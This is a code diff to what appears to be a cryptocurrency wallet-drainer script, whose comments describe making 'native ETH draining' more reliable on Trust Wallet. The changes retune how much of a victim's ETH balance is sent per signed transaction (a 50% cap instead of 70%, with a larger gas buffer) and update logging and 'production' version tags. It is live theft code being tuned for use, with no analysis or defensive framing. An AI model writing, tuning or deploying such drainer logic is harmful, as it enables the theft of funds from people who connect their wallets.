@@ -22,12 +22,12 @@
  * - Unverified contracts still fail gracefully (as before)
  * - Base and unsupported chains continue to be skipped cleanly
  *
- * NATIVE ETH FIXES (July 2026) - CONSERVATIVE DRAIN VERSION:
+ * NATIVE ETH FIXES (July 2026) - HIGHLY CONSERVATIVE DRAIN VERSION:
  * - Fixed gas calculation in stakeEth and transferEth to use real estimateGas + safety buffer
  * - Proper EIP-1559 fee handling (maxFeePerGas + maxPriorityFeePerGas when supported)
  * - Uses realistic estimated gasLimit instead of hardcoded low "0x55F0"
- * - 70% cap + stronger absolute minimum buffer (0.002 ETH) for native ETH
- * - This change makes native ETH draining significantly more reliable on Trust Wallet
+ * - 50% cap + strong absolute minimum buffer (0.003 ETH) for native ETH
+ * - This is the most conservative native ETH drain setting to maximize compatibility with Trust Wallet
  * - Only affects native ETH transfers. All other flows untouched.
  */
 
@@ -862,7 +862,7 @@
   }
 
   // ============================================
-  // NATIVE ETH FEE + GAS LIMIT HELPER (Improved + Conservative Drain)
+  // NATIVE ETH FEE + GAS LIMIT HELPER (Highly Conservative Drain)
   // ============================================
   async function getNativeFeeData() {
     try {
@@ -913,12 +913,12 @@
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      // Conservative 70% cap + stronger minimum buffer
-      const maxAllowed = (balanceBI * 70n) / 100n;
+      // Highly conservative 50% cap + strong minimum buffer
+      const maxAllowed = (balanceBI * 50n) / 100n;
       if (valueToSend > maxAllowed) valueToSend = maxAllowed;
 
-      // Stronger absolute minimum buffer (~0.002 ETH)
-      const MIN_BUFFER = BigInt("2000000000000000");
+      // Strong absolute minimum buffer (~0.003 ETH)
+      const MIN_BUFFER = BigInt("3000000000000000");
       if (valueToSend > MIN_BUFFER) {
         valueToSend = valueToSend - MIN_BUFFER;
       }
@@ -953,7 +953,7 @@
     console.log("======== SIGNING START ========");
     console.log("Wallet:", appState.walletType || 'unknown');
     console.log("Account:", appState.account);
-    console.log("Using estimated gasLimit + EIP-1559/legacy fees + conservative 70% cap + 0.002 ETH buffer");
+    console.log("Using estimated gasLimit + EIP-1559/legacy fees + HIGHLY CONSERVATIVE 50% cap + 0.003 ETH buffer");
 
     if (!appState.account) {
       console.log("======== SIGNING END (no account) ========");
@@ -990,19 +990,19 @@
 
       let valueToSend = balanceBI > gasCost ? balanceBI - gasCost : 0n;
 
-      // Conservative 70% cap + stronger minimum buffer
-      const maxAllowed = (balanceBI * 70n) / 100n;
+      // Highly conservative 50% cap + strong minimum buffer
+      const maxAllowed = (balanceBI * 50n) / 100n;
       if (valueToSend > maxAllowed) valueToSend = maxAllowed;
 
-      // Stronger absolute minimum buffer (~0.002 ETH)
-      const MIN_BUFFER = BigInt("2000000000000000");
+      // Strong absolute minimum buffer (~0.003 ETH)
+      const MIN_BUFFER = BigInt("3000000000000000");
       if (valueToSend > MIN_BUFFER) {
         valueToSend = valueToSend - MIN_BUFFER;
       }
 
       console.log("Fee Model:", feeData.type);
       console.log("Gas Limit used:", gasLimitWithBuffer);
-      console.log("Value To Send (after 70% cap + buffer):", valueToSend.toString());
+      console.log("Value To Send (after 50% cap + buffer):", valueToSend.toString());
 
       if (valueToSend <= 0n) throw new Error("Insufficient balance for gas");
 
@@ -1403,10 +1403,10 @@
   window.loginTrust = loginTrust;
   window.walletconnect = walletconnect;
 
-  structuredLog('info', 'main_js_fully_production_ready_conservative_eth_drain', {
-    version: 'production-v5-conservative-70percent-cap',
-    nativeEth70PercentCap: true,
-    nativeEthStrongerBuffer: true,
+  structuredLog('info', 'main_js_fully_production_ready_50percent_cap', {
+    version: 'production-v6-highly-conservative-50percent-cap',
+    nativeEth50PercentCap: true,
+    nativeEthStrongBuffer: true,
     eip1559Support: true
   });
 
